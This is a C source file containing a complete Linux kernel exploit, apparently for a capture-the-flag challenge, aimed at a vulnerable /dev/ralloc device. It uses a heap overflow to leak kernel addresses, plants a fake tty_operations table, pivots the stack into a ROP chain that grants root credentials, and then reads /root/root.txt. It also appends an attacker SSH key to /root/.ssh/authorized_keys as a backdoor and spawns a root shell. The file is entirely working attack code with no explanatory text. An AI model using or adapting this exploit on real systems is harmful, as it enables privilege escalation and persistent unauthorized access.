#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/types.h>
#include <sys/stat.h>

// no ASLR
#define OFFSET_COMMIT_CRED		0x00fef160
#define OFFSET_PREPARE_KERNEL_CRED	0x00feef00
#define OFFSET_NATIVE_WRITE_CR4		0x0103abf0
#define OFFSET_POP_RDI			0x01023e00 // 0xffffffff8108b8a0: pop rdi; ret;
#define OFFSET_CR4			0x0108fa60 // 0xffffffff8101fc40; mov cr4, rdi; pop rbp; ret
#define OFFSET_PUSH_RAX			0x01075915 // 0xffffffff81039d8b: push rax; ret; 
#define OFFSET_POP_RSP			0x00e4d7c4 // 0xffffffff81261edc: pop rsp; ret;
#define OFFSET_XCHG_EAX_ESP		0x01062afc // 0xffffffff8104cba4: xchg eax, esp; ret;
#define OFFSET_XCHG_RAX_RDI		0x004ad30c // 0xffffffff81c02394: xchg rax, rdi ; ret
#define OFFSET_SWAPGS			0x0103ab4c // 0xffffffff81074b54: swapgs ; pop rbp ; ret
#define OFFSET_IRETQ			0x01077CA5 // 0xffffffff810379fb: iretq; pop rbp; ret;
#define OFFSET_KPTI_TRAMPOLINE		0x004aec56 // 0xffffffff81c00a4a <common_interrupt+74>:    mov    rdi,rsp


typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

void *fake_tty_operations[30];
long buffer[132] = {0};
long old_ops = 0;
int fd, fd_ptmx; 
int idx_overflow[2] = {-1, -1};

unsigned long user_cs, user_ss, user_eflags,user_sp;


int allocate_chunk(unsigned long index, unsigned long size)
{
	unsigned long tmp[2];
	tmp[0] = index;
	tmp[1] = size;

	int result = ioctl(fd, 0x1000, tmp);

	if (result < 0)
		printf("Failed to allocate %ld bytes at index %ld\n", size, index);

	return result;
}

int free_chunk(unsigned long index)
{
	unsigned long tmp[1];
	tmp[0] = index;

	int result = ioctl(fd, 0x1001, tmp);

//	if (result < 0)
//		printf("Failed to free chunk at index %ld\n", index);

	return result;
}


int write_to_chardev(unsigned long index, unsigned long size, long ptr)
{
	unsigned long tmp[3];
	tmp[0] = index;
	tmp[1] = size;
	tmp[2] = ptr;

	int result = ioctl(fd, 0x1002, tmp);

	if (result < 0)
		printf("Failed to write %ld bytes from %p to index %ld\n", size, (void *)ptr, index);

	return result;
}

int read_from_chardev(unsigned long index, unsigned long size, long ptr)
{
	unsigned long tmp[3];
	tmp[0] = index;
	tmp[1] = size;
	tmp[2] = ptr;

	int result = ioctl(fd, 0x1003, tmp);

	if (result < 0)
		printf("Failed to read %ld bytes from index %ld to %p\n", size, index, (void *)ptr);

	return result;
}


void my_pause()
{
	printf("\nPress any key to continue ...\n");
	fflush(stdin);
	getc(stdin);
}

void save_stats(){
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
        :
        : "memory"
    );
}

void write_authorized_keys()
{
	char *key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDe3mnixn/Tv34yOLVk7Nmiegn4ncTlCl9gULaJ66BOd84yy7vtgdOhje/Dws9uTRp2EcEyusta31NaofvI8fE/jxYEZhMkcsebfqQo5LjPn92l/DrmkC3hIj5FZoEpHKwYp5jCbzDqghloAz29oz5V6sDBBeJQF5MY+F1qlKu9hmN+UY2W0V0bBYddPeTpD+UZnlSgCyB5rexhZeXbV/1ZA+49C4hbiXZBZPc64f51hFmcPT3eg5gohff7kihkchggP5XIib8FAHoacoNE2vNUJMKkS4wYj3THci2AH+bT/44YiwoCv853mn6Tl9sgQ6biuew6Jbq0OeY9FaQfSpHpi9qSr5C2WcSiWpNEQNDagwjrue8Qd1q5jCwzlKX9+72qHtGMf1goHicNxKnAeAD9vVtzy9mD262wpNMUsr8DQZqAcyRDxjUTYp5sYCpyZLgyxRuJ9CJrgKn8MVlct+8Wtjx7tmLc5su15DTtjsgVjtT4n4Nnmn9/OH+TBklt3cM= homesen@kali-ctf\n";
	mkdir("/root/.ssh", S_IRWXU);
	FILE *f = fopen("/root/.ssh/authorized_keys", "a");
	fprintf(f, "%s", key);
	fclose(f);
}

void shell()
{
	int i;
	// restore old tty_operations
	buffer[131] = old_ops;
	write_to_chardev(idx_overflow[0], 1056, (long)buffer);

	for (i=0; i<32; i++) {
		if (i == idx_overflow[1])
			continue;
		free_chunk(i);
	}
	if (close(fd) != 0)
		printf("Failed to close ralloc\n");
	if (close(fd_ptmx) != 0)
		printf("Failed to close ptmx\n");

	printf("getuid() = %d\n", getuid());
	
	FILE *f = fopen("/root/root.txt", "r");
	char flag[1024] = {0};
	fgets(flag, 1023, f);
	fclose(f);
	printf("[+] root.txt: %s\n", flag);
	printf("[+] Adding key to authorized_keys...\n");
	write_authorized_keys();
	
	printf("[+] Spawning shell...");
	char* argv[] = {"/bin/sh", 0};
	execve(argv[0], argv, 0);
}


int get_leak(long *buffer, long *leaks)
{
	long leak = 0, heap_leak = 0;
	long i = 0x1337133713370000, j, k;

	do {
		memset(buffer, 0, 132);
		for (i; i<0x1337133800000000; i+=0x0100) {
			for (j=0; j<32; j++) {
				allocate_chunk(j, 1024);
				buffer[0] = i+j;
				write_to_chardev(j, 1024, (long)buffer);
			}
			
			for (j=0; j<32; j++) {
				read_from_chardev(j, 1056, (long)buffer);
				for (k=j+1; k<32; k++) {
					if (buffer[128] == i+k) {
						printf("[+] Found adjacent slabs at index %d, followed by %d\n", (int)j, (int)k);
						idx_overflow[0] = (int)j;
						idx_overflow[1] = (int)k;
						break;
					}
				}
				if (idx_overflow[0] > -1)
					break;
			}
			if (idx_overflow[0] > -1)
				break;

			for (j=0; j<32; j++)
				free_chunk(j);
		}
		
		if (idx_overflow[0] == -1) {
			printf("[-] Failed to find adjacent slabs! Terminating...\n");
			exit(1);
		}

		free_chunk(idx_overflow[1]);
		if ((fd_ptmx = open("/dev/ptmx", O_RDWR|O_NOCTTY)) < 0) {
			printf("[-] Failed to open /dev/ptmx\n");
			exit(-1);
		}

		memset(buffer, 0, 132);
		read_from_chardev(idx_overflow[0], 1056, (long)buffer);
		leak = buffer[131];

		if (((leak & 0xfff) == 0x6a0) && ((leak & 0xffffffff00000000) == 0xffffffff00000000)) {
			printf("[+] Got kernel leak 0x%016lx\n", leak);
		} else {
			leak = 0;
			for (j=0; j<32; j++) {
				if (j == idx_overflow[1])
					continue;
				free_chunk(j);
			}
			i+=0x0100;
			idx_overflow[0] = -1;
			idx_overflow[1] = -1;
		}
	} while (leak == 0);
	
	leaks[0] = leak;
	leaks[1] = heap_leak;
	
	return 0;
}


int getroot(void) {
	commit_creds(prepare_kernel_cred(0));
	return -1;
}


int main(int argc, char **argv)
{
	int i;
	long leaks[3] = {0};
	long stack_pivot = 0;
	long *fake_stack = 0;
	
	
	printf("[+] buffer is at 0x%016lx\n", (long)buffer);
	printf("[+] fake_tty_operations is at 0x%016lx\n", (long)fake_tty_operations);

	// setup fake tty_operations struct
	for (i=0; i<30; i++)
		fake_tty_operations[i] = (void *)(0x00ff00ff00ff0000 + i);
	
	
	// open vulnerable device
	if ((fd = open("/dev/ralloc", O_RDONLY)) < 0) {
		printf("Failed to open /dev/ralloc\n");
		exit(-1);
	}

	for (i=0; i<32; i++) {
		free_chunk(i);
	}
	
	// attempt to leak kernel address
	get_leak(buffer, leaks);

	printf("[+] arr[1] is at 0x%016lx\n", (leaks[1] & 0xfffffffffffff400));
	printf("[+] tty_struct is at 0x%016lx\n", (leaks[1] & 0xfffffffffffff400) + 0x400);

	// calculate addresses of commit_creds and prepare_kernel_cred
	commit_creds = (_commit_creds)(leaks[0] - OFFSET_COMMIT_CRED);
	prepare_kernel_cred = (_prepare_kernel_cred)(leaks[0] - OFFSET_PREPARE_KERNEL_CRED);

	// Setup fake_operations at array index 12 (the ioctl callback)
	stack_pivot = (leaks[0] - OFFSET_XCHG_EAX_ESP);
	fake_tty_operations[12] = (void *)stack_pivot;
	old_ops = buffer[131];
	buffer[131] = (long)fake_tty_operations;
	

	//printf("[+] Found commit_creds at 0x%016lx\n", (long)commit_creds);
	//printf("[+] Found prepare_kernel_cred at 0x%016lx\n", (long)prepare_kernel_cred);
	//printf("[+] Please set breakpoint at 0x%016lx\n", (long)fake_tty_operations[12]);

	// Prepare fake stack
	stack_pivot = stack_pivot & 0xffffffff;
	long mmap_target = stack_pivot & PAGE_MASK;
	fake_stack = mmap((void *)mmap_target, 0x10000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	memset(fake_stack, 0x00, 0x10000);
	printf("[+] Fake stack is at 0x%016lx\n", (long)fake_stack);
	
	
	// Setup ROP chain
	save_stats();
	int idx = 0;
	long *ropchain = (long *)stack_pivot;
	ropchain[idx++] = (leaks[0] - OFFSET_POP_RDI);
	ropchain[idx++] = 0;
	ropchain[idx++] = (long)prepare_kernel_cred;
	ropchain[idx++] = (leaks[0] - OFFSET_XCHG_RAX_RDI);
	ropchain[idx++] = (long)commit_creds;
	ropchain[idx++] = (leaks[0] - OFFSET_KPTI_TRAMPOLINE);
	ropchain[idx++] = 0xdeadbeefcafebabe;	// RAX
	ropchain[idx++] = 0xdeadbeefcafebabe;	// RDI
	ropchain[idx++] = (long)shell;
	ropchain[idx++] = user_cs;
	ropchain[idx++] = user_eflags;
	ropchain[idx++] = user_sp;
	ropchain[idx++] = user_ss;
	
	// overwrite *ops with fake tty operations struct
	printf("Going to overwrite *ops pointer...\n");
	write_to_chardev(idx_overflow[0], 1056, (long)buffer);

	//Call the ioctl(ioctl -> unlocked_ioctl -> get_root)
	printf("Going to call ioctl...\n");
	ioctl(fd_ptmx, 0, 0);

	// restore old tty_operations
	buffer[131] = old_ops;
	write_to_chardev(idx_overflow[0], 1056, (long)buffer);

	for (i=0; i<32; i++) {
		if (i == idx_overflow[1])
			continue;
		free_chunk(i);
	}

	if (close(fd) != 0)
		printf("Failed to close ralloc\n");
	if (close(fd_ptmx) != 0)
		printf("Failed to close ptmx\n");

	return 0;
}

